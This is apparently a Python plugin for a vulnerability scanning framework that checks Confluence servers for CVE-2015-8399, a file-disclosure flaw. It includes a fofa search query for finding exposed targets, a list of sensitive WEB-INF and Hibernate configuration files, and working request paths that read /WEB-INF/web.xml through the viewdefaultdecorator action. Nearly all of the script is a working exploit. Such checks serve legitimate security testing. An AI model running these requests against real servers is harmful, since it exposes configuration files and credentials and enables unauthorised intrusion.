#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: orleven

from lib.util.aiohttputil import ClientSession
from lib.core.enums import ServicePortMap
from script import BaseScript

class Script(BaseScript):
    """
    CVE-2015-8399
    fofa:  "confluence" && port=8090
    https://www.exploit-db.com/exploits/39170/

    /WEB-INF/decorators.xml
    /WEB-INF/glue-config.xml
    /WEB-INF/server-config.wsdd
    /WEB-INF/sitemesh.xml
    /WEB-INF/urlrewrite.xml
    /WEB-INF/web.xml
    /databaseSubsystemContext.xml
    /securityContext.xml
    /services/statusServiceContext.xml
    com/atlassian/confluence/security/SpacePermission.hbm.xml
    com/atlassian/confluence/user/OSUUser.hbm.xml
    com/atlassian/confluence/security/ContentPermissionSet.hbm.xml
    com/atlassian/confluence/user/ConfluenceUser.hbm.xml
    """

    def __init__(self):
        BaseScript.__init__(self)
        self.service_type = ServicePortMap.WEB

    async def prove(self):
        if self.base_url:
            poc_list = [
                'admin/viewdefaultdecorator.action?decoratorName=/WEB-INF/web.xml',
                'spaces/viewdefaultdecorator.action?decoratorName=/WEB-INF/web.xml',
            ]
            async with ClientSession() as session:
                for poc in poc_list:
                    url = self.base_url + poc
                    async with session.get(url=url) as response:
                        if response != None:
                            text = await response.text()
                            if response.status == 200 and "<web-app" in text:
                                yield url
